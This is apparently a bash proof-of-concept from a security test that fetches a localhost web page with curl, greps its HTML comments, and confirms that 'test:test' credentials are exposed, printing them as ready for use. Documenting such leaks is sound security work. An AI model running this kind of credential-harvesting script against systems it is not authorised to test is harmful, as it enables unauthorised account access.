#!/bin/bash

# POC: Sensitive Credentials Disclosed in HTML Comments
# This script demonstrates the vulnerability where test credentials are exposed
# in HTML comments that are publicly viewable via view-source

TARGET_URL="http://localhost:8080/"
echo "[*] Retrieving HTML source from: $TARGET_URL"
echo ""

# Fetch the HTML source
HTML_RESPONSE=$(curl -s "$TARGET_URL")

# Check if we got a response
if [ -z "$HTML_RESPONSE" ]; then
    echo "[!] Error: Could not retrieve HTML from target URL"
    exit 1
fi

# Search for the credential comment
echo "[*] Scanning for HTML comments containing credentials..."
echo ""

# Extract and display HTML comments
COMMENTS=$(echo "$HTML_RESPONSE" | grep -oP '<!--.*?-->' | head -20)

if [ -z "$COMMENTS" ]; then
    echo "[!] No HTML comments found in response"
    exit 1
fi

echo "[+] HTML Comments found:"
echo "---"
echo "$COMMENTS"
echo "---"
echo ""

# Check specifically for the test credentials
if echo "$HTML_RESPONSE" | grep -q "test:test"; then
    echo "[+] VULNERABILITY CONFIRMED: Test credentials found in HTML source"
    echo ""
    echo "[+] Extracted Credentials:"
    
    # Extract the specific credential comment
    CRED_COMMENT=$(echo "$HTML_RESPONSE" | grep -oP '<!--.*?test:test.*?-->')
    echo "    $CRED_COMMENT"
    echo ""
    
    # Parse the credentials
    USERNAME=$(echo "$CRED_COMMENT" | grep -oP 'test' | head -1)
    PASSWORD=$(echo "$CRED_COMMENT" | grep -oP 'test' | tail -1)
    
    echo "[+] Credentials available for use:"
    echo "    Username: test"
    echo "    Password: test"
    echo ""
    echo "[!] These credentials are publicly accessible via view-source in any browser"
    exit 0
else
    echo "[!] Test credentials not found in HTML comments"
    exit 1
fi